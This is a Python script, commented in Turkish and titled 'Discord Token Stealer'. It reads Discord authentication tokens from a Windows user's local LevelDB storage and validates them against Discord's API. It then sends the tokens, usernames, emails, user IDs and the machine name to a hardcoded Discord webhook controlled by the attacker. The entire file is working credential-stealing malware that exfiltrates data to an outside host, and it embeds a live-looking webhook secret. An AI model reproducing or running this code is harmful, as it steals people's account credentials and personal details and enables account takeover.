#!/usr/bin/env python3
import os
import re
import requests
import json
import platform
from datetime import datetime

# Discord Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1346549944504545418/PYDrb8f7SDIaxV67eIgW9M9fRQNxldR7GAr7XnmD3suHzBbKIh6vE-O6tCfvYtm-EfMi"

def debug_webhook():
    """Webhook'u test et"""
    print("[+] Webhook test ediliyor...")
    
    test_data = {
        "content": "🔍 **Webhook Test Mesajı**",
        "embeds": [{
            "title": "Test Başarılı!",
            "description": "Webhook çalışıyor.",
            "color": 0x00ff00,
            "timestamp": datetime.utcnow().isoformat()
        }],
        "username": "Token Hunter Debug"
    }
    
    try:
        response = requests.post(WEBHOOK_URL, json=test_data, timeout=10)
        print(f"[+] Webhook response: {response.status_code}")
        if response.status_code == 204:
            print("[+] Webhook çalışıyor!")
            return True
        else:
            print(f"[-] Webhook hatası: {response.status_code} - {response.text}")
            return False
    except Exception as e:
        print(f"[-] Webhook bağlantı hatası: {e}")
        return False

def find_discord_tokens():
    """Discord token'larını bul"""
    print("[+] Discord token aranıyor...")
    
    tokens = []
    token_pattern = re.compile(r'(mfa\.[a-zA-Z0-9_-]{84}|[A-Za-z0-9]{24}\.[A-Za-z0-9]{6}\.[A-Za-z0-9_-]{27})')
    
    # Windows Discord yolları
    discord_paths = [
        os.path.expandvars(r'%APPDATA%\Discord'),
        os.path.expandvars(r'%LOCALAPPDATA%\Discord'),
        os.path.expandvars(r'%USERPROFILE%\AppData\Roaming\Discord'),
        os.path.expandvars(r'%USERPROFILE%\AppData\Local\Discord')
    ]
    
    for base_path in discord_paths:
        print(f"[*] Kontrol ediliyor: {base_path}")
        if not os.path.exists(base_path):
            print(f"[-] Path bulunamadı: {base_path}")
            continue
            
        # LevelDB dizini
        leveldb_path = os.path.join(base_path, "Local Storage", "leveldb")
        if os.path.exists(leveldb_path):
            print(f"[+] LevelDB bulundu: {leveldb_path}")
            for file in os.listdir(leveldb_path):
                if file.endswith(('.ldb', '.log')):
                    file_path = os.path.join(leveldb_path, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            found_tokens = token_pattern.findall(content)
                            for token in found_tokens:
                                if token not in tokens:
                                    tokens.append(token)
                                    print(f"[+] Token bulundu: {token}")
                    except Exception as e:
                        print(f"[-] Dosya okuma hatası {file}: {e}")
        else:
            print(f"[-] LevelDB bulunamadı: {leveldb_path}")
    
    return tokens

def verify_token(token):
    """Token'ın geçerli olup olmadığını kontrol et"""
    print(f"[*] Token doğrulanıyor: {token[:30]}...")
    headers = {'Authorization': token}
    try:
        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
        if response.status_code == 200:
            user_data = response.json()
            print(f"[+] Geçerli token: {user_data['username']}")
            return {
                'valid': True,
                'username': f"{user_data['username']}#{user_data.get('discriminator', '0000')}",
                'email': user_data.get('email', 'N/A'),
                'phone': user_data.get('phone', 'N/A'),
                'id': user_data.get('id', 'N/A')
            }
        else:
            print(f"[-] Geçersiz token: {response.status_code}")
    except Exception as e:
        print(f"[-] Token doğrulama hatası: {e}")
    return {'valid': False}

def send_to_discord(tokens_data):
    """Bulunan token'ları Discord webhook'a gönder"""
    print("[+] Discord'a gönderiliyor...")
    
    if not tokens_data:
        print("[-] Gönderilecek token bulunamadı")
        # Boş token bilgisi gönder
        empty_data = {
            "content": "❌ **Token Bulunamadı**",
            "embeds": [{
                "title": "Tarama Tamamlandı",
                "description": "Hiç token bulunamadı.",
                "color": 0xff0000,
                "timestamp": datetime.utcnow().isoformat()
            }]
        }
        
        try:
            response = requests.post(WEBHOOK_URL, json=empty_data, timeout=10)
            print(f"[+] Boş sonuç gönderildi: {response.status_code}")
        except Exception as e:
            print(f"[-] Gönderim hatası: {e}")
        return
    
    # Embed oluştur
    embed = {
        "title": "🔑 Discord Token Bulundu",
        "color": 0x00ff00,
        "timestamp": datetime.utcnow().isoformat(),
        "fields": [],
        "footer": {
            "text": f"Sistem: {platform.system()} - {platform.node()}"
        }
    }
    
    valid_count = 0
    for token_info in tokens_data:
        if token_info['valid']:
            valid_count += 1
            embed["fields"].append({
                "name": f"✅ {token_info['username']}",
                "value": f"Token: `{token_info['token']}`\nEmail: {token_info['email']}\nID: {token_info['id']}",
                "inline": False
            })
        else:
            embed["fields"].append({
                "name": "❌ Geçersiz Token",
                "value": f"`{token_info['token'][:50]}...`",
                "inline": False
            })
    
    embed["description"] = f"**Toplam {len(tokens_data)} token bulundu ({valid_count} geçerli)**"
    
    data = {
        "content": "🎯 **Yeni Tokenlar Bulundu!**",
        "embeds": [embed],
        "username": "Token Hunter",
        "avatar_url": "https://cdn.discordapp.com/emojis/1064421532343664751.png"
    }
    
    try:
        print("[+] Webhook'a veri gönderiliyor...")
        response = requests.post(WEBHOOK_URL, json=data, timeout=10)
        print(f"[+] Webhook response: {response.status_code}")
        if response.status_code in [200, 204]:
            print("[+] Token'lar Discord'a başarıyla gönderildi!")
        else:
            print(f"[-] Discord'a gönderim hatası: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"[-] Webhook gönderim hatası: {e}")

def main():
    """Ana fonksiyon"""
    print("=" * 50)
    print("Discord Token Stealer - DEBUG MODE")
    print("=" * 50)
    
    # 1. Webhook test
    if not debug_webhook():
        print("[-] Webhook çalışmıyor, işlem iptal edildi!")
        return
    
    # 2. Token'ları bul
    tokens = find_discord_tokens()
    print(f"[+] Bulunan token sayısı: {len(tokens)}")
    
    # 3. Token'ları doğrula
    tokens_data = []
    for token in tokens:
        user_info = verify_token(token)
        tokens_data.append({
            'token': token,
            'valid': user_info['valid'],
            'username': user_info.get('username', 'N/A'),
            'email': user_info.get('email', 'N/A'),
            'phone': user_info.get('phone', 'N/A'),
            'id': user_info.get('id', 'N/A')
        })
    
    # 4. Discord'a gönder
    send_to_discord(tokens_data)
    print("[+] İşlem tamamlandı!")

if __name__ == "__main__":
    main()
